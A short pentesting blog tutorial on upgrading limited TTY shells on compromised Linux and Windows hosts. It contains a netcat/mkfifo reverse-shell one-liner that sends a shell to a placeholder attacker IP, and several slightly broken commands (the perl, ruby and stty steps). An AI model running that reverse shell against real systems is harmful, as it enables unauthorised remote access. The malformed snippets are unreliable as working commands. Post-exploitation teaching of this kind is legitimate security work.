---
title:  Upgrading an autocomplete TTY shell on Linux and Windows: a guide for pentesters
date: 2024-11-06 10:10:00 +0700
categories: [Other]
tags: [Other, tty-shell, autocomplete]
pin: false
description: Upgrading TTY Shell
---

## Upgrading an autocomplete TTY shell on Linux and Windows: a guide for pentesters

### Introduction

When working with command-line interfaces on compromised machines, it is common to be limited to basic TTY shells that lack essential features like autocomplete and history. Upgrading these shells can significantly improve usability and efficiency during post-exploitation. This guide covers methods to upgrade TTY shells on both Linux and Windows targets to provide functionalities such as command history and tab completion, making them easier to work with.

### Verify installed language(s)

Before attempting to upgrade or interact with shells, it's important to verify which interpreters and shells are available on the target system. This helps determine the best approach to proceed. Here's how to check which interpreters or shells are installed:
```shell
# Check if Python is installed and its location
which python    # Output will show the path if Python 2.x is installed

# Check for Python 3 installation
which python3   # Output will show the path if Python 3.x is installed

# Verify if Bash is available
which bash      # Output will show the path if Bash is installed

# Check for PowerShell on a Linux machine (if applicable)
which pwsh      # This shows if PowerShell Core is available on Linux

# For Windows, check in Command Prompt or PowerShell for presence
where python    # Equivalent to 'which' in Windows
where python3
where bash
```
### Examples

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
echo os.system('/bin/bash')
```

```bash
/bin/sh -i
```

```bash
perl —e 'exec "/bin/sh";'
```

```bash
ruby: exec "/bin/sh"
```

```shell
# if python isn't installed, then use:
script /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.xxx.xxx 9001 >/tmp/f
```
After you have choosen one of these, to get an autocomplete shell, use:

```bash
ctrl-z 

stty raw -echo; fg

# send to background

# On attacker's machine

stty raw -echo 

stty -a 

get local number of rows & columns
fg 
# Press Enter Enter

Now you should have an autocomplete shell
```
